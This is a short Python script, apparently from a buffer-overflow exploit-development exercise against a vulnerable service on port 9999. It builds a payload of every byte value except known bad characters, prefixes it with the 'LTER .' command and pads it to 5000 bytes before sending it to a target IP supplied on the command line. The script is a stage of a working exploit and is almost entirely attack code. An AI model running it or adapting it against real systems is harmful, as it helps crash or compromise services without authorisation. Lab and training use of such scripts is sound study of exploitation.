#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# SEt of Bad Chars to exclude
EXCLUDE = ('0x0', '0xa', '0xd')

# Empty Data Array
DATA_ARRAY = bytearray()
# Array Generation
for char in range(256): 
    if (hex(char) not in EXCLUDE):
        DATA_ARRAY.append(int(hex(char), 16))

# Generate message DATA
DATA = bytes(DATA_ARRAY)

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'LTER .' +
    DATA + 
    b'C' * (5000 - len(DATA_ARRAY))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)